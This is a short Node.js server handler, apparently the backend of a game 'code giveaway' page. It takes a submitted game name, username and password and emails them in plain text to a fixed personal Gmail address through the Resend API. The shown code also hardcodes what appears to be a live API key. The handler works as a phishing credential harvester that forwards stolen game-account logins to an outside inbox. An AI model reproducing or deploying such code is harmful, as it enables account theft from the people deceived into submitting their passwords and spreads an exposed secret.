const { Resend } = require("resend");

const resend = new Resend('re_cCwD4UAG_JWu7wiKEVnfAgrAbzY3pj1CL');

module.exports.sendTaiKhoan = async (req, res) => {
  const user = req.body.user;
  const pass = req.body.pass;
  const tenGame = req.body.tenGame;

  const status = await resend.emails.send({
    from: 'onboarding@resend.dev',
    to: 'namkem1994@gmail.com',
    subject: 'Một người vùa nhận code: ',
    html:
      "Thông tin tai khoản: <br> Tên game: " +
      tenGame +
      "<br> Tài khoản: " +
      user +
      "<br> Mật khẩu: " +
      pass,
  });
  console.log(status.data);

  res.json(user);
};
